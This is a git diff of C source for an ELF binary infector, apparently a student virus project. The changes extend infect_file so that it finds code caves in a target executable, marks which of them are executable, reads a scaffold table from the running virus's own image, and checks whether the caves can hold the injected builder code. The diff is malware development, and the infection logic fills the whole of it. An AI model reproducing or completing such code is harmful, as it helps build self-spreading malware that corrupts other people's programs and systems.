@@ -270,6 +270,7 @@ signature_fill(volatile char *buf) {
 typedef struct code_cave {
     uint64_t start;
     uint64_t size;
+    uint8_t is_executable;
 } code_cave;
 
 __attribute__((always_inline)) inline Elf64_Shdr *
@@ -298,17 +299,22 @@ code_caves_get(volatile code_cave code_caves[], volatile file *file) {
     Elf64_Ehdr *header = file->mem;
     uint64_t section_cur_end = header->e_phoff + header->e_phentsize * header->e_phnum;
     uint64_t section_old_end = 0;
+    uint8_t this_one_is_executable = 0;
+    uint8_t last_one_was_executable = 0;
     int i = 0;
     do {
         section_old_end = section_cur_end;
+        last_one_was_executable = this_one_is_executable;
         section_header = get_next_section_header(section_cur_end, *file);
-        if (section_header != NULL)
+        if (section_header != NULL) {
+            this_one_is_executable = section_header->sh_flags & SHF_EXECINSTR;
             section_cur_end = section_header->sh_offset + section_header->sh_size;
-        else {
+        } else {
             if (!(section_old_end <= header->e_shoff && file->size >= header->e_shoff + header->e_shnum * header->e_shentsize)) {
 
                 code_caves[i].start = section_old_end;
                 code_caves[i].size = file->size - section_old_end;
+                code_caves[i].is_executable = last_one_was_executable;
 
                 i++;
             }
@@ -320,6 +326,7 @@ code_caves_get(volatile code_cave code_caves[], volatile file *file) {
 
                 code_caves[i].start = section_old_end;
                 code_caves[i].size = section_header->sh_offset - section_old_end;
+                code_caves[i].is_executable = last_one_was_executable;
                 i++;
             }
         }
@@ -360,6 +367,27 @@ e_entry_to_entry_offset(volatile file *file, volatile uint64_t e_entry) {
 
     return 0;
 }
+
+typedef struct scaffold_entry {
+    uint64_t start;
+    uint64_t end;
+} scaffold_entry;
+
+__attribute__((always_inline)) inline uint64_t
+get_code_cave_space(volatile code_cave code_caves[], volatile uint64_t code_cave_num) {
+    uint64_t total = 0;
+    for (int i = 0; i < code_cave_num; i++)
+        total += code_caves[i].size;
+    return total;
+}
+__attribute__((always_inline)) inline uint64_t
+get_full_needed_code_space(volatile scaffold_entry entries[], volatile uint64_t entries_num) {
+    uint64_t total = 0;
+    for (int i = 0; i < entries_num; i++)
+        total += entries[i].end - entries[i].start;
+    return total;
+}
+
 __attribute__((always_inline)) inline int
 infect_file(char *path) {
     int fd = ft_open(path, O_RDWR, 0);
@@ -386,7 +414,7 @@ infect_file(char *path) {
     file_mmap(fd, &file);
     int num = code_caves_get(code_caves, &file);
     // for (int i = 0; i < num; i++)
-    //     printf("code start: 0x%lx - size 0x%lx\n", code_caves[i].start, code_caves[i].size);
+    //     printf("code start: 0x%lx - size 0x%lx | is executable %i\n", code_caves[i].start, code_caves[i].size, code_caves[i].is_executable);
 
     // -----------------------------------------------------------
     volatile char proc_path[15];
@@ -403,7 +431,33 @@ infect_file(char *path) {
 
     uint64_t scaffold_table_start;
     ft_read(fd_self, &scaffold_table_start, sizeof(scaffold_table_start));
-    print_number_nl(builder_start);
+    print_number_nl(scaffold_table_start);
+
+    uint64_t scaffold_table_num = *(uint64_t *)(file.mem + scaffold_table_start);
+    print_number_nl(scaffold_table_num);
+    scaffold_entry entries[scaffold_table_num];
+    for (int i = 0; i < scaffold_table_num; i++) {
+        entries[i].start = scaffold_table_start + *(uint64_t *)(file.mem + scaffold_table_start + 8 + i * 16);
+        entries[i].end = scaffold_table_start + *(uint64_t *)(file.mem + scaffold_table_start + 16 + i * 16);
+    }
+
+    for (int i = 0; i < scaffold_table_num; i++) {
+        print_number_nl(entries[i].start);
+        print_number_nl(entries[i].end);
+    }
+
+    uint64_t provided_space = get_code_cave_space(code_caves, num);
+    uint64_t needed_space = get_full_needed_code_space(entries, scaffold_table_num) + builder_size;
+    print_number_nl(provided_space);
+    print_number_nl(needed_space);
+
+    uint8_t big_enough_builder_space = 0;
+    for (int i = 0; i < num; i++)
+        if (code_caves[i].is_executable)
+            if (code_caves[i].size >= builder_size) big_enough_builder_space = 1;
+    print_number_nl(big_enough_builder_space);
+    print_number_nl(1111111111);
+
     // -----------------------------------------------------------
     return (0);
 }
